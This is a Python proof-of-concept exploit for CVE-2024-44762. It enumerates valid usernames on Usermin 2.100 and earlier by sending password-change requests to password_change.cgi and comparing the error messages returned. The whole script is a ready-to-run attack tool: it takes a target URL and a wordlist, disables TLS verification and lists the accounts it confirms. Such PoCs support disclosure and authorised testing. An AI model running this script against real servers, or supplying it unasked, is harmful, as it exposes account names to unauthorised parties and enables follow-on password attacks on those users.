#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Usermin ≤2.100  |  username enumeration PoC  |  CVE‑2024‑44762
#
# Example:
#   python3 userenum_usermin.py -u https://TARGET:20000 -w users.txt
#
# Requirements: python3, requests  (tqdm optional for fancy progress bar)

import argparse
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

# ── argparse ────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(
    description="Usermin ≤2.100 username‑enumeration PoC (CVE‑2024‑44762)"
)
parser.add_argument("-u", "--url", required=True,
                    help="Full base URL of Usermin (e.g. https://127.0.0.1:20000)")
parser.add_argument("-w", "--wordlist", required=True,
                    help="Path to a username word‑list")

args = parser.parse_args()
base_url = args.url.rstrip("/")            # tidy up any trailing slash

# ── suppress TLS warnings (self‑signed certs etc.) ─────────────────────────────
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ── read usernames from word‑list ──────────────────────────────────────────────
try:
    with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as fh:
        usernames = [line.strip() for line in fh if line.strip()]
except FileNotFoundError:
    sys.exit(f"[!] Word‑list not found: {args.wordlist}")

total = len(usernames)
print(f"[*] Enumerating {total} usernames against {base_url}")

# ── helper: iterator with optional tqdm progress bar ───────────────────────────
def progress(iterable, total):
    try:
        from tqdm import tqdm                              # noqa: F401
        return tqdm(iterable, total=total, desc="Enumerating", unit="user")
    except ImportError:
        # Fallback: manual heartbeat every 100 attempts
        def gen():
            for idx, item in enumerate(iterable, 1):
                if idx % 100 == 0 or idx == total:
                    print(f"[*] Tested {idx}/{total}")
                yield item
        return gen()

# ── enumeration loop ───────────────────────────────────────────────────────────
valid = []

for user in progress(usernames, total):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"{base_url}/password_change.cgi"
    }
    data = {
        "user": user,
        "pam": "",
        "expired": "2",
        "old": "dummyPass!",         # bogus current password
        "new1": "WeakPass1!",
        "new2": "WeakPass1!"
    }

    try:
        r = requests.post(f"{base_url}/password_change.cgi",
                          data=data, headers=headers,
                          verify=False, timeout=10)
    except requests.RequestException as e:
        sys.exit(f"[!] HTTP request failed: {e}")

    # Positive signature ➜ username exists (password wrong)
    if "Failed to change password: The current password is incorrect." in r.text:
        print(f"[+] Possible valid username: {user}")
        valid.append(user)

    # Negative signature ➜ username does *not* exist; keep going
    elif "Failed to change password: Your login name was not found" in r.text:
        continue

    # Anything else ➜ unexpected / maybe not vulnerable
    else:
        print("[*] Unexpected response – target may not be vulnerable. Exiting.")
        break

# ── summary ────────────────────────────────────────────────────────────────────
print("\n[+] Finished.")
if valid:
    print(f"[+] {len(valid)} username(s) likely valid:")
    for v in valid:
        print("    " + v)
else:
    print("[-] No valid usernames discovered.")
